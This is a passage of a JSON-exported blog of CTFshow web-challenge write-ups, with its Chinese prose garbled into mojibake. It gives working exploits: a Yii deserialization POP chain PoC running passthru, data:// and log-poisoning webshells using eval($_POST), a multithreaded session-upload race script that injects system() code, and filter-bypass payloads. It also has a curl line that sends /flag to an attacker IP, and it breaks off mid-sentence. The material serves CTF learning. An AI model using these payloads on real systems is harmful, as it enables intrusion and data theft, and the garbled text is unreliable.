å‚\n\n```PHP\n<?php\nclass ctfshowAdmin{\n   public $token;\n   public $password;\n   public function __construct(){\n       $this->token='a';\n       $this->password = &$this->token;\n\t}\n}\n$a=new ctfshowAdmin();\necho serialize($a);\n?>\n```\n\n**266**\n\nåŒ¹é…æŠ›å‡ºå¼‚å¸¸å__destrurtä¸è§¦å‘ï¼Œæ‰€ä»¥ä½¿ç”¨å¤§å°å†™ç»•è¿‡å³å¯\n\n**267**\n\nyiiæ¡†æ¶çš„ååºåˆ—åŒ–æ¼æ´ï¼Œåˆ©ç”¨çš„ç±»\n\n```PHP\nyii\\db\\BatchQueryResult\n    public function __destruct()\n    {\n        // make sure cursor is closed\n        $this->reset();\n    }\n    public function reset()\n    {\n        if ($this->_dataReader !== null) {\n            $this->_dataReader->close();\n        }\n        $this->_dataReader = null;\n        $this->_batch = null;\n        $this->_value = null;\n        $this->_key = null;\n    }\n\nè¿™é‡Œçš„$this->_dataReaderå†…å®¹å¯æ§ï¼Œå¯ä»¥è°ƒç”¨ä¸å­˜åœ¨closeæ–¹æ³•å¹¶ä¸”å­˜åœ¨__callæ–¹æ³•çš„ç±»ï¼Œå…¨å±€æœç´¢__callæ–¹æ³•åï¼Œå‘ç°åœ¨\nyii\\vendor\\fzaninotto\\faker\\src\\Faker\\Generator.php\n    public function __call($method, $attributes)\n    {\n        return $this->format($method, $attributes);\n    }\nè·Ÿè¿›format\n    public function format($formatter, $arguments = array())\n    {\n        return call_user_func_array($this->getFormatter($formatter), $arguments);\n    }\nè·Ÿè¿›getFormatter\n    public function getFormatter($formatter)\n    {\n        if (isset($this->formatters[$formatter])) {\n            return $this->formatters[$formatter];\n        }\n        foreach ($this->providers as $provider) {\n            if (method_exists($provider, $formatter)) {\n                $this->formatters[$formatter] = array($provider, $formatter);\n                return $this->formatters[$formatter];//è¿™é‡Œä¼šè¿”å›ä¼ å…¥çš„$formatterçš„å€¼\n            }\n        }\n        throw new \\InvalidArgumentException(sprintf('Unknown formatter \"%s\"', $formatter));\n    }\nå‘ç°formatæ–¹æ³•ä¸­çš„call_user_func_arrayçš„ç¬¬ä¸€ä¸ªå‚æ•°å¯æ§ï¼Œæƒ³è¦åˆ©ç”¨è¿›è€ŒæŸ¥æ‰¾è°ƒç”¨äº†call_user_funcå‡½æ•°çš„æ— å‚æ–¹æ³•ã€‚å‘ç°äº†IndexAction.phpä¸­çš„runæ–¹æ³•\nyii\\rest\\IndexAction.php\n    public function run()\n    {\n        if ($this->checkAccess) {\n            call_user_func($this->checkAccess, $this->id);\n        }\n\n        return $this->prepareDataProvider();\n    }\nåœ¨runæ–¹æ³•ä¸­checkAccesså’Œidéƒ½å¯æ§ï¼Œåˆ©ç”¨é“¾æ„é€ æˆåŠŸ\n```\n\nåˆ©ç”¨é“¾\n\n`yii\\db\\BatchQueryResult::__destruct() -> Faker\\Generator::__call() -> yii\\rest\\IndexAction::run()`\n\n```php\npoc\n<?php\nnamespace yii\\rest{\n    class CreateAction{\n        public $checkAccess;\n        public $id;\n\n        public function __construct(){\n            $this->checkAccess = 'passthru';\n            $this->id = 'tac /flag';\n        }\n    }\n}\n\nnamespace Faker{\n    use yii\\rest\\CreateAction;\n\n    class Generator{\n        protected $formatters;\n\n        public function __construct(){\n            $this->formatters['close'] = [new CreateAction(), 'run'];\n        }\n    }\n}\n\nnamespace yii\\db{\n    use Faker\\Generator;\n\n    class BatchQueryResult{\n        private $_dataReader;\n\n        public function __construct(){\n            $this->_dataReader = new Generator;\n        }\n    }\n}\nnamespace{\n    echo base64_encode(serialize(new yii\\db\\BatchQueryResult));\n}\n?>\n\n```\n\n","tags":["CTF","web"]},{"title":"CTFshowæ–‡ä»¶åŒ…å«","url":"/posts/5550.html","content":"\n# æ–‡ä»¶åŒ…å«\n\nå¸¸è§çš„æ–‡ä»¶åŒ…å«æ¼æ´å‡½æ•°ï¼šinclude()ï¼Œrequire()\n\n### æœ¬åœ°åŒ…å«\n\n#### åˆ©ç”¨æ–¹å¼ï¼š\n\n###### 1ã€php://inputï¼š\n\n```\n?file=php://input\nè¯·æ±‚ä½“å†…ä¸ºPHPä»£ç ï¼š<?php phpinfo(); ?>\n```\n\nphp://inputå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå°†postè¯·æ±‚çš„æ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp://inputï¼ŒåŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚\n\né‡åˆ°file_get_contents()è¦æƒ³åˆ°ç”¨php://inputç»•è¿‡ã€‚\n\n<!--more-->\n\n###### 2ã€php://filterï¼š\n\n```\n?file=php://filter/rescource=xxx.php\nä»¥base64ç¼–ç è¯»å–\n?file=php://filter/read=convert.base64-encode/resource=xxx.php\n```\n\nphp://filterå¯ä»¥è·å–æŒ‡å®šæ–‡ä»¶æºç ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œphp://filteræµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œè®©å…¶ä¸æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–ã€‚\n\n###### 3ã€zip://ï¼š\n\n```\n?file=zip://[å‹ç¼©åŒ…ç»å¯¹è·¯å¾„]#[å‹ç¼©åŒ…å†…æ–‡ä»¶]\n```\n\nzip:// å¯ä»¥è®¿é—®å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œzip://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚\n\n- zip://ä¸­åªèƒ½ä¼ å…¥ç»å¯¹è·¯å¾„ã€‚\n- è¦ç”¨#åˆ†éš”å‹ç¼©åŒ…å’Œå‹ç¼©åŒ…é‡Œçš„å†…å®¹ï¼Œå¹¶ä¸”#è¦ç”¨urlç¼–ç %23\n- åªéœ€è¦æ˜¯zipçš„å‹ç¼©åŒ…å³å¯ï¼Œåç¼€åå¯ä»¥ä»»æ„æ›´æ”¹ã€‚\n- ç›¸åŒçš„ç±»å‹çš„è¿˜æœ‰zlib://å’Œbzip2://\n\n###### 4ã€data://ï¼š\n\n```\n?file=data://[<MIME-type>][;cherset=<encoding>][;base64],<data>\nä¸‹é¢ä¸ºç¤ºä¾‹\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTsgPz4=\n```\n\ndata:// åŒæ ·ç±»ä¼¼ä¸php://inputï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚\n\n###### 5ã€phar//ï¼š\n\n```\n?file=phar://å‹ç¼©åŒ…è·¯å¾„ï¼ˆç›¸å¯¹ç»å¯¹éƒ½å¯ï¼‰/å‹ç¼©åŒ…å†…æ–‡ä»¶\n```\n\néœ€è¦phar://æœ‰ç‚¹ç±»ä¼¼zip://åŒæ ·å¯ä»¥å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚~~æœªæ¥çš„æˆ‘è¡¥ä¸€å¥ï¼Œè¿™ç©æ„è¿˜æ˜¯ä¹–ä¹–ç”¨æ¥ååºåˆ—åŒ–æ¯”è¾ƒå¥½~~\n\n#### å¯ä¾›åŒ…å«çš„å†…å®¹ï¼š\n\n###### 1ã€åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶ï¼š\n\n###### **æ¡ä»¶ï¼šå¯¹æ—¥å¿—æ–‡ä»¶å¯è¯»å¹¶ä¸”çŸ¥é“æ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨ç›®å½•**\n\n**æ³¨æ„äº‹é¡¹ï¼š**ä¸€èˆ¬æƒ…å†µä¸‹æ—¥å¿—å­˜å‚¨ç›®å½•è¢«ä¿®æ”¹ï¼Œéœ€è¦è¯»å–æœåŠ¡å™¨é…ç½®æ–‡ä»¶ï¼ˆhttpdï¼Œconfï¼Œnginxï¼Œconf...ï¼‰æˆ–è€…æ ¹æ®phpinfo()ä¸­çš„ä¿¡æ¯æ¥å¾—çŸ¥ã€‚è¿˜æœ‰å°±æ˜¯æ—¥å¿—è®°å½•çš„ä¿¡æ¯éƒ½å¯ä»¥è¢«è°ƒæ•´ï¼Œæ¯”å¦‚è®°å½•æŠ¥é”™çš„ç­‰çº§æˆ–è€…å†…å®¹æ ¼å¼ã€‚\n\nApacheè¿è¡Œåä¸€èˆ¬é»˜è®¤ä¼šç”Ÿæˆä¸¤ä¸ªæ—¥å¿—æ–‡ä»¶ï¼ŒWindosä¸‹æ˜¯access.logï¼ˆè®¿é—®æ—¥å¿—ï¼‰å’Œerror.log(é”™è¯¯æ—¥å¿—)ï¼ŒLinuxä¸‹æ˜¯access_logå’Œerror_logï¼Œè®¿é—®æ—¥å¿—æ–‡ä»¶è®°å½•äº†å®¢æˆ·ç«¯çš„æ¯æ¬¡è¯·æ±‚å’ŒæœåŠ¡å™¨å“åº”çš„ç›¸å…³ä¿¡æ¯ã€‚\n\nå¦‚æœè®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„èµ„æºæ—¶ï¼Œå¦‚http://www.xxxx.com/<?php phpinfo(); ?>,åˆ™ä¼šè®°å½•åœ¨æ—¥å¿—ä¸­ï¼Œä½†æ˜¯ä»£ç ä¸­çš„æ•æ„Ÿå­—ç¬¦ä¼šè¢«æµè§ˆå™¨è½¬ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡burpsuitç»•è¿‡ç¼–ç ï¼Œå°±å¯ä»¥æŠŠ<?php phpinfo(); ?> å†™å…¥apacheçš„æ—¥å¿—æ–‡ä»¶ï¼Œç„¶åå¯ä»¥é€šè¿‡åŒ…å«æ—¥å¿—æ–‡ä»¶æ¥æ‰§è¡Œæ­¤ä»£ç ï¼Œä½†å‰ææ˜¯ä½ å¾—çŸ¥é“apacheæ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„ï¼Œæ‰€ä»¥ä¸ºäº†å®‰å…¨èµ·è§ï¼Œå®‰è£…apacheæ—¶å°½é‡ä¸è¦ä½¿ç”¨é»˜è®¤è·¯å¾„ã€‚\n\nå¯ä»¥æ”¾åœ¨User-Agentä¸­\n\n###### 2ã€åŒ…å«SESSION\n\n**æ¡ä»¶ï¼š**æ‰¾åˆ°Sessionå†…çš„å¯æ§å˜é‡ï¼Œå¹¶ä¸”Sessionæ–‡ä»¶å¯è¯»å†™ï¼Œå¹¶ä¸”çŸ¥é“å­˜å‚¨è·¯å¾„ï¼ŒPHPä¸­SESSIONæ–‡ä»¶ä¿å­˜è·¯å¾„å¯ä»¥åœ¨phpinfoä¸­çœ‹åˆ°\n\n**å¸¸è§è·¯å¾„ï¼š**\n\n/var/lib/php/sess_PHPSESSID\n/tmp/sess_PHPSESSID\n/tmp/sessions/sess_PHPSESSID\nsessionæ–‡ä»¶æ ¼å¼ï¼š sess_[phpsessid] ï¼Œè€Œ phpsessid åœ¨å‘é€çš„è¯·æ±‚çš„ cookie å­—æ®µä¸­å¯ä»¥çœ‹åˆ°ã€‚\n\n\n###### 3ã€åŒ…å«/pros/self/environ\n\n**å†…å®¹ï¼š**proc/self/environä¸­ä¼šä¿å­˜user-agentå¤´ï¼Œå¦‚æœåœ¨user-agentä¸­æ’å…¥phpä»£ç ï¼Œåˆ™phpä»£ç ä¼šè¢«å†™å…¥åˆ°environä¸­ï¼Œä¹‹åå†åŒ…å«å®ƒï¼Œå³å¯ã€‚\n\n**æ¡ä»¶ï¼š**phpä»¥cgiæ–¹å¼è¿è¡Œï¼Œè¿™æ ·environæ‰ä¼šä¿æŒUAå¤´ã€‚environæ–‡ä»¶å­˜å‚¨ä½ç½®å·²çŸ¥ï¼Œä¸”environæ–‡ä»¶å¯è¯»ã€‚\n\n###### 4ã€åŒ…å«ä¸´æ—¶æ–‡ä»¶\n\nphpä¸­ä¸Šä¼ æ–‡ä»¶ï¼Œä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚åœ¨linuxä¸‹ä½¿ç”¨/tmpç›®å½•ï¼Œè€Œåœ¨windowsä¸‹ä½¿ç”¨C:\\Winsdows\\tempç›®å½•ã€‚åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰ï¼Œåˆ©ç”¨ç«äº‰å³å¯åŒ…å«è¯¥ä¸´æ—¶æ–‡ä»¶ã€‚\n\nç”±äºåŒ…å«éœ€è¦çŸ¥é“åŒ…å«çš„æ–‡ä»¶åã€‚ä¸€ç§æ–¹æ³•æ˜¯è¿›è¡Œæš´åŠ›çŒœè§£ï¼Œlinuxä¸‹ä½¿ç”¨çš„éšæœºå‡½æ•°æœ‰ç¼ºé™·ï¼Œè€Œwindowä¸‹åªæœ‰65535ä¸­ä¸åŒçš„æ–‡ä»¶åï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ˜¯å¯è¡Œçš„ã€‚\n\nå¦ä¸€ç§æ–¹æ³•æ˜¯é…åˆphpinfoé¡µé¢çš„php variablesï¼Œå¯ä»¥ç›´æ¥è·å–åˆ°ä¸Šä¼ æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„å’Œä¸´æ—¶æ–‡ä»¶åï¼Œç›´æ¥åŒ…å«å³å¯ã€‚\n\n##### 78\n\n```\npayload:?file=php://filter/convert.base64-encode/resource=flag.php\n```\n\næ— è¿‡æ»¤ç›´æ¥ä¼ªåè®®è¯»å–flag\n\n##### 79\n\n```\npayload:?file=data://text/plain,<?=eval($_POST['cmd']);?>\nPOST\ncmd=system('cat flag.php');\n\npayload:?file=data://text/plain,base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=\n```\n\nè¿‡æ»¤äº†phpï¼Œå¯ä½¿ç”¨dataåè®®ï¼Œé€šè¿‡å†ä¼ å…¥ä¸€ä¸ªå‚æ•°æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¹Ÿå¯base64è§£ç å‡ºæƒ³æ‰§è¡Œçš„å‘½ä»¤\n\n##### 80\n\n```\n?file=/var/log/nginx/access.log\nHEADER\nUser-Agent=<?php eval($_POST[['cmd']]);?>\nPOST\ncmd=system('cat fl0g.php');\n```\n\nè¿‡æ»¤äº†dataï¼Œå¯é€šè¿‡åŒ…å«æ—¥å¿—æ¥æ‰§è¡Œå‘½ä»¤\n\n##### 81\n\n```\n?file=/var/log/nginx/access.log\nHEADER\nUser-Agent=<?php eval($_POST[['cmd']]);?>\nPOST\ncmd=system('cat fl0g.php');\n```\n\nè¿‡æ»¤äº†å†’å·ï¼Œæ—¥å¿—åŒ…å«ä¾ç„¶å¯è¡Œ\n\n##### 82\n\nè¿‡æ»¤äº†.ï¼Œåªèƒ½åŒ…å«æ— åç¼€æ–‡ä»¶ï¼Œåœ¨PHPä¸­å”¯ä¸€èƒ½æ§åˆ¶çš„æ— åç¼€æ–‡ä»¶å°±æ˜¯sessionæ–‡ä»¶ï¼Œæ‰€ä»¥å°è¯•é€šè¿‡è„šæœ¬ç«äº‰åŒ…å«å†™å…¥\n\n```\nåŸç†ï¼šåœ¨æˆ‘ä»¬è‡ªè¡Œæ·»åŠ PHPSSEIDåˆ°ç½‘é¡µä¸­æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶åœ¨/tmp/sess_nameï¼Œæ–‡ä»¶åå¯æ§ã€‚æ–‡ä»¶å†…å®¹é€šè¿‡PHP_ SESSION_UPLOAD_PROGRESSå‚æ•°æ§åˆ¶ï¼Œè¯¥å‚æ•°ç”¨äºå®æ—¶è·å–æ–‡ä»¶ä¸Šä¼ è¿›åº¦ï¼Œä¼šè¿”å›ä¸€ä¸ªSESSIONï¼Œå¹¶ä¸”è¯¥å‚æ•°çš„å†…å®¹å°†ä¼šè¢«åŠ å…¥åˆ°sess_nameæ–‡ä»¶ä¸­\næ–¹æ³•ï¼šä¸€è¾¹æ„é€ POSTæ–‡ä»¶ä¼ è¾“è¯·æ±‚ï¼Œå°†PHP_SESSION_UPLOAD_PROGRESSåŒ…å«åˆ°è¯·æ±‚å¤´ä¸­ï¼Œä¸€è¾¹åŒ…å«/tmp/sess_nameæ–‡ä»¶\n```\n\n##### 83-86\n\n```Python\n# ç«äº‰ä¸‡èƒ½è„šæœ¬ï¼š\n# os.system('rm -rf /bin/Azuki')\n# æ¶ˆç­Azukiä¿å¹³å®‰\nimport io\nimport requests\nimport threading\n\nsessID = 'flag'\nurl = 'http://193cefd4-47a6-444e-801b-39906604df13.challenge.ctf.show/'\n\n\ndef write(session):\n    while event.isSet():\n        f = io.BytesIO(b'a' * 1024 * 50)\n        response = session.post(\n            url,\n            cookies={'PHPSESSID': sessID},\n            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php system(\"cat *.php\");?>'},\n            files={'file': ('test.txt', f)}\n        )\n\n\ndef read(session):\n    while event.isSet():\n        response = session.get(url + '?file=/tmp/sess_{}'.format(sessID))\n        if 'test' in response.text:\n            print(response.text)\n            event.clear()\n        else:\n            print('[*]retrying...')\n\n\nif __name__ == '__main__':\n    event = threading.Event()\n    event.set()\n    with requests.session() as session:\n        for i in range(1, 30):\n            threading.Thread(target=write, args=(session,)).start()\n\n        for i in range(1, 30):\n            threading.Thread(target=read, args=(session,)).start()\n```\n\n**87**\n\nå…ˆè´´ä¸€ä¸ª[æ–‡ç« ](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)\n\nå¯¹äºphp://filterçš„ä½¿ç”¨\n\nç®€å•ç‰ˆæœ¬ï¼šä½¿ç”¨rot13ç¼–è§£ç ç»•è¿‡\n\n```\npayload:?file=php://filter/write=string.rot13/resource=1.phpï¼ˆè®°å¾—è¿›è¡Œä¸¤æ¬¡URLç¼–ç ï¼‰\nPOST:\npbagrag=<?cuc flfgrz('gnp s*.cuc');?>\n<?php system('tac f*.php');?>ç»è¿‡rot13ç¼–ç \n```\n\nå¤æ‚ç‰ˆæœ¬ï¼šä½¿ç”¨base64ç¼–è§£ç ç»•è¿‡\n\n```\npayload:?file=php://filter/write=string.rot13/resource=1.phpï¼ˆè®°å¾—è¿›è¡Œä¸¤æ¬¡URLç¼–ç ï¼‰\nPOST:\npbagrag=<?cuc flfgrz('gnp s*.cuc');?>\n<?php system('tac f*.php');?>ç»è¿‡rot13ç¼–ç \n```\n\nåŸç†ï¼šåœ¨è¿‡æ»¤å™¨è¿›è¡Œbase64ç¼–è§£ç æ—¶ï¼Œä¼šç»•è¿‡æ‰€æœ‰ä¸å±äºbase64ç¼–ç åçš„å­—ç¬¦ï¼ˆ+, / , 0~9,a~z,A~Zï¼‰ï¼Œæ¯”å¦‚é¢˜ä¸­çš„`<?php die(\"å¤§ä½¬åˆ«ç§€äº†\");?>`ï¼Œè¿‡æ»¤å™¨è¯†åˆ«åˆ°çš„å­—ç¬¦åªæœ‰phpdieï¼Œå…¶ä½™çš„å­—ç¬¦è¢«å¿½ç•¥ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨æˆ‘ä»¬å·²ç»ç¼–å¥½çš„base64æ–‡æœ¬åŠ ä¸¤ä¸ªå­—æ¯å³å¯è®©phpdiexxè¢«è§£æä¸ºbase64ç¼–ç åè¯­å¥ï¼Œä¸åé¢ä»£ç æ— å…³äº†\n\n**88**\n\næ„é€ è¯­å¥ä½¿å¾—base64ç¼–ç ååªå«æ•°å­—å’Œå­—æ¯å³å¯\n\n```\npayload:?file=data://text/plain;base64,PD9waHAgICBldmFsKCRfUE9TVFsxXSk7\n//<?php   eval($_POST[1]);\nPOST:\n1=system('tac f*');\n```\n","tags":["CTF","web"]},{"title":"CTFshowå‘½ä»¤æ‰§è¡Œ","url":"/posts/47520.html","content":"\n# å‘½ä»¤æ‰§è¡Œ\n\nå±é™©å‡½æ•°ï¼š\n\n```\n------------------------------------------------æ‰§è¡Œ(ç³»ç»Ÿ)å‡½æ•°\n\t eval\n\t exec - æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åº\n\t shell_exec\n\t system\n\t passthru\n\t proc_open\n\t pcntl_exec â€” åœ¨å½“å‰è¿›ç¨‹ç©ºé—´æ‰§è¡ŒæŒ‡å®šç¨‹åº\n\t pcntl_fork  åœ¨å½“å‰è¿›ç¨‹å½“å‰ä½ç½®äº§ç”Ÿåˆ†æ”¯ï¼ˆå­è¿›ç¨‹ï¼‰ã€‚\n\t dl â€” è¿è¡Œæ—¶è½½å…¥ä¸€ä¸ª PHP æ‰©å±•\n\t unserialize - ååºåˆ—åŒ–ä¸€ä¸ªç±»å‡½æ•°nashell\n\t ------------------------------------------------æ˜¾ç¤ºæºç    \n\t phpinfo\n\t readfile\n\t readline\n\t show_source\n\t heighlight\n\t heighlight_string\n\t curl\n\t php\n   curl -f filename=@/flag [è¦ä¼ åˆ°çš„ipåœ°å€å’Œç«¯å£]\t\n\t è§£é‡Šï¼šåœ¨linuxé‡Œé¢å•å¼•å·é‡Œé¢çš„çš„å‘½ä»¤ä¼šç›´æ¥å…ˆæ‰§è¡Œ\n\t ä»¥ä¸Šçš„curl -få‘½ä»¤ä¼šæŠŠ@åé¢æ–‡ä»¶åå¯¹åº”çš„æ–‡ä»¶ä¼ è¾“åˆ°æŒ‡å®šçš„ipç«¯å£åœ°å€\n\t æ‰€ä»¥ä¼šç›´æ¥æ‰§è¡Œcurlå‘½ä»¤å°†å¾—åˆ°çš„flagæ–‡ä»¶ä¼ è¾“åˆ°æŒ‡å®šidç«¯å£ï¼Œä¸éœ€è¦ç®¡ping\t  å‘½ä»¤äº†åªè¦ç›‘å¬æ­¤ç«¯å£æ‹¿åˆ°æ–‡ä»¶å³å¯\n\t file \n\t ------------------------------------------------å›è°ƒå‡½æ•°\n\t array_walk\n\t array_walk_recursive\n\t array_map\n\t call_user_func_array\n\t call_user_func\n\t ------------------------------------------------æ•°ç»„ä½¿ç”¨å›è°ƒå‡½æ•°è¿‡æ»¤\n\t array_filter\n\t filter_var\n\t filter_var_array\n\t ------------------------------------------------å†™å…¥æ–‡ä»¶\n\t fopen\n\t fwrite\n\t file_put_contents - å°†æ•°æ®å†™å…¥æ–‡ä»¶ä¸­\n\t file-get-contents - è·å–å‚æ•°çš„æ–‡ä»¶èµ„æº\n\t move_uploaded_file - å°†ä¸Šä¼ çš„æ–‡ä»¶ç§»åŠ¨åˆ°æ–°ä½ç½®\n\t ------------------------------------------------å‘½ä»¤å­—ç¬¦ä¸²è½¬ä¹‰\n\t escapeshellcmd - å¯¹ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰\n\t escapeshellarg â€” æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°\n\t ------------------------------------------------å…¶ä»–\n\t proc_terminate â€” æ€é™¤ç”± proc_open æ‰“å¼€çš„è¿›ç¨‹\n\t touch - è®¾å®šæ–‡ä»¶çš„è®¿é—®å’Œä¿®æ”¹æ—¶é—´\n```\n\nå¯ç”¨äºæ‰§è¡Œphpå‡½æ•°çš„å‡½æ•°ï¼š\n\n```\neval()ã€assert()ã€preg_replace(\"/test/e\",$_POST[\"cmd\"],\"jutst test\")\n//æ­£åˆ™è§„åˆ™ä¸­å«æœ‰/eä¿®é¥°ç¬¦å°±å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´\ncreate_function()\n```\n\nå¯ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š\n\n```php\nexec()//è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœï¼ŒåŠ echo\npassthru()//æ‰§è¡Œåç›´æ¥æ˜¾ç¤ºç»“æœ\nsystem()//æ‰§è¡Œåç›´æ¥æ˜¾ç¤ºç»“æœ,è¿”å›å€¼ï¼šæˆåŠŸåˆ™è¿”å›å‘½ä»¤è¾“å‡ºçš„æœ€åä¸€è¡Œï¼Œ å¤±è´¥åˆ™è¿”å› false\nshell_exec()//è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœï¼ŒåŠ echo\n`å‘½ä»¤`//è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœï¼ŒåŠ echo\npopen()\nproc_open()\npcntl_exec()\n```\n\n<!--more-->\n\nå¯ç”¨äºæ›¿ä»£ç©ºæ ¼çš„å­—ç¬¦ï¼š\n\n```\n%09ã€$IFS$9ã€ ${IFS}ã€$IFS%09ã€< ã€<>ã€%20ç­‰\n```\n\nå¯ç”¨äºè¯»å–æ–‡ä»¶çš„å‘½ä»¤ï¼š\n\n```\ncat\ntac\nhead\nmore\nless\ncut\nnl\nls / | tee 1.txt\nå°†lsåçš„ç»“æœå†™å…¥1.txtä¸­\n```\n\né€šé…ç¬¦ï¼š\n\n```\n*ä»£è¡¨ä»»æ„ä½\n?ä»£è¡¨ä¸€ä½\n```\n\n**å–åç»•è¿‡**\n\nåŸç†ï¼šphpå­—ç¬¦ä¸²å–åä¹‹åå¯ç»•è¿‡æ­£åˆ™\n\n```php\n<?php\n\t$s='phpinfo';\n\techo urlencode(~$s);\n\t//%8F%97%8F%96%91%99%90\n?>\n```\n\nè¿™æ—¶ä¼ å…¥`a=(~%8F%97%8F%96%91%99%90)();`\n\nå³å¯æ‰§è¡Œphpinfoå‡½æ•°\n\nå¯¹äºPHPï¼Œå½¢å¦‚ `(func_name)()`ï¼Œå…¶ä¸­func_nameå¯ä»¥æ˜¯å­—ç¬¦ä¸²ï¼Œä¼šæ‰§è¡Œè¿™ä¸ªfunc\n\nä½†æ˜¯å¦‚æœåªä¼ å…¥`(~%8F%97%8F%96%91%99%90%D7%D6)`å†…å®¹ä¸º`phpinfo()`ï¼Œä¼šå‘ç°æ­¤æ—¶å‡½æ•°ä¸ä¼šè¢«æ‰§è¡Œï¼Œæ­¤æ—¶phpå–åå–å¾—äº†phpinfoï¼Œä½†æ˜¯å–åå¾—åˆ°çš„å­—ç¬¦ä¸² `phpinfo()`å¹¶ä¸ä¼šè¢«å½“ä½œä»£ç æ‰§è¡Œï¼Œå› ä¸ºåœ¨å–åä¹‹å‰PHPè§£é‡Šå™¨å¹¶ä¸çŸ¥é“è¿™åŸæ¥æ˜¯ `phpinfo()`\n\næ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³æ‰§è¡Œshellï¼Œæ˜¯ä¸èƒ½å•ä¼ å…¥ä¸€ä¸ª`$_POST['kkk']`çš„å–åæ¥æ‰§è¡Œçš„ï¼Œè€Œæ˜¯éœ€è¦ä½¿ç”¨åµŒå¥—æ‰§è¡Œçš„æ–¹å¼ï¼Œå½¢å¦‚`assert($_POST[kkk])`ä¼ å…¥`(~%9E%8C%8C%9A%8D%8B)(~%DB%A0%AF%B0%AC%AB%A4%94%94%94%A2)`å†ä¼ å…¥å‘½ä»¤kkkæ¥æ‰§è¡Œ\n\n\n\n\n\n\n\n\n\n\n\n##### 29\n\n```\npayload:?c=echo(`cat%20f*`);\n```\n\né¢˜ç›®è¿‡æ»¤äº†flagï¼Œä½¿ç”¨é€šé…ç¬¦ç»•è¿‡ï¼Œf*ä»£è¡¨åŒ¹é…æ‰€æœ‰ä»¥få¼€å¤´çš„æ–‡ä»¶ï¼Œ\\`å†…éƒ¨ä¸ºæ‰§è¡Œçš„å‘½ä»¤ï¼Œé€šè¿‡echoå¾—åˆ°è¿”å›å€¼\\`\n\n##### 30\n\n```\npayload:?c=echo(`cat%20f*`);\n```\n\né¢˜ç›®è¿‡æ»¤äº†flag,system,phpï¼ŒåŒä¸Š\n\n##### 31\n\n```\npayload:?c=echo(`tac%09f*`);\n```\n\né¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼ï¼Œä½¿ç”¨%09å°†ç©ºæ ¼æ›¿ä»£å³å¯\n\n##### 32\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\né¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼,å•å¼•å·,æ³¢æµªå·,echo,åˆ†å·,æ‹¬å·ï¼Œå¯ä»¥ä½¿ç”¨æ–‡ä»¶åŒ…å«å‡½æ•°`include()`ï¼Œincludeå¯ä»¥å®ç°æ— æ‹¬å·åŒ…å«ï¼Œè¿›è€Œé€šè¿‡`?>`å°†æ•´ä¸ªPHPä»£ç é—­åˆå³å¯ç»•è¿‡åˆ†å·ï¼Œè€Œåå°±èƒ½åšåˆ°å‚æ•°é€ƒé€¸ï¼ˆå› ä¸ºä»£ç ä¸­åªæ£€æµ‹äº†cä¸­ä¼ 